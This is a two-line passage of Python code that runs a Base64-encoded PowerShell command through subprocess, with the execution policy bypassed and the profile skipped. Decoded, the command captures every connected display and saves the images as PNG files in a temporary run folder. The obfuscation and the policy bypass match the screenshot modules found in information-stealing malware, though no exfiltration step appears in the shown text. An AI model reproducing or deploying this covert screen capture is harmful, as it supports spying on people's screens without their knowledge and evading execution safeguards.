             command = "JABzAG8AdQByAGMAZQAgAD0AIABAACIADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtADsADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AQwBvAGwAbABlAGMAdABpAG8AbgBzAC4ARwBlAG4AZQByAGkAYwA7AA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzADsADQAKAA0ACgBwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAFMAYwByAGUAZQBuAHMAaABvAHQADQAKAHsADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAEwAaQBzAHQAPABCAGkAdABtAGEAcAA+ACAAQwBhAHAAdAB1AHIAZQBTAGMAcgBlAGUAbgBzACgAKQANAAoAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAdgBhAHIAIAByAGUAcwB1AGwAdABzACAAPQAgAG4AZQB3ACAATABpAHMAdAA8AEIAaQB0AG0AYQBwAD4AKAApADsADQAKACAAIAAgACAAIAAgACAAIAB2AGEAcgAgAGEAbABsAFMAYwByAGUAZQBuAHMAIAA9ACAAUwBjAHIAZQBlAG4ALgBBAGwAbABTAGMAcgBlAGUAbgBzADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAZgBvAHIAZQBhAGMAaAAgACgAUwBjAHIAZQBlAG4AIABzAGMAcgBlAGUAbgAgAGkAbgAgAGEAbABsAFMAYwByAGUAZQBuAHMAKQANAAoAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAcgB5AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIAZQBjAHQAYQBuAGcAbABlACAAYgBvAHUAbgBkAHMAIAA9ACAAcwBjAHIAZQBlAG4ALgBCAG8AdQBuAGQAcwA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHUAcwBpAG4AZwAgACgAQgBpAHQAbQBhAHAAIABiAGkAdABtAGEAcAAgAD0AIABuAGUAdwAgAEIAaQB0AG0AYQBwACgAYgBvAHUAbgBkAHMALgBXAGkAZAB0AGgALAAgAGIAbwB1AG4AZABzAC4ASABlAGkAZwBoAHQAKQApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB1AHMAaQBuAGcAIAAoAEcAcgBhAHAAaABpAGMAcwAgAGcAcgBhAHAAaABpAGMAcwAgAD0AIABHAHIAYQBwAGgAaQBjAHMALgBGAHIAbwBtAEkAbQBhAGcAZQAoAGIAaQB0AG0AYQBwACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGcAcgBhAHAAaABpAGMAcwAuAEMAbwBwAHkARgByAG8AbQBTAGMAcgBlAGUAbgAoAG4AZQB3ACAAUABvAGkAbgB0ACgAYgBvAHUAbgBkAHMALgBMAGUAZgB0ACwAIABiAG8AdQBuAGQAcwAuAFQAbwBwACkALAAgAFAAbwBpAG4AdAAuAEUAbQBwAHQAeQAsACAAYgBvAHUAbgBkAHMALgBTAGkAegBlACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcgBlAHMAdQBsAHQAcwAuAEEAZABkACgAKABCAGkAdABtAGEAcAApAGIAaQB0AG0AYQBwAC4AQwBsAG8AbgBlACgAKQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoACAAKABFAHgAYwBlAHAAdABpAG8AbgApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC8ALwAgAEgAYQBuAGQAbABlACAAYQBuAHkAIABlAHgAYwBlAHAAdABpAG8AbgBzACAAaABlAHIAZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAcgBlAHQAdQByAG4AIAByAGUAcwB1AGwAdABzADsADQAKACAAIAAgACAAfQANAAoAfQANAAoAIgBAAA0ACgANAAoAQQBkAGQALQBUAHkAcABlACAALQBUAHkAcABlAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAHMAbwB1AHIAYwBlACAALQBSAGUAZgBlAHIAZQBuAGMAZQBkAEEAcwBzAGUAbQBiAGwAaQBlAHMAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALAAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwANAAoADQAKACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzACAAPQAgAFsAUwBjAHIAZQBlAG4AcwBoAG8AdABdADoAOgBDAGEAcAB0AHUAcgBlAFMAYwByAGUAZQBuAHMAKAApAA0ACgANAAoADQAKAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQAcwAuAEMAbwB1AG4AdAA7ACAAJABpACsAKwApAHsADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0ACAAPQAgACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzAFsAJABpAF0ADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0AC4AUwBhAHYAZQAoACIALgAvAEQAaQBzAHAAbABhAHkAIAAoACQAKAAkAGkAKwAxACkAKQAuAHAAbgBnACIAKQANAAoAIAAgACAAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQALgBEAGkAcwBwAG8AcwBlACgAKQANAAoAfQA=" # Unicode encoded command
             subprocess.run(["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-EncodedCommand", command], shell=True, capture_output=True, cwd= tmp + f"\\{run}")
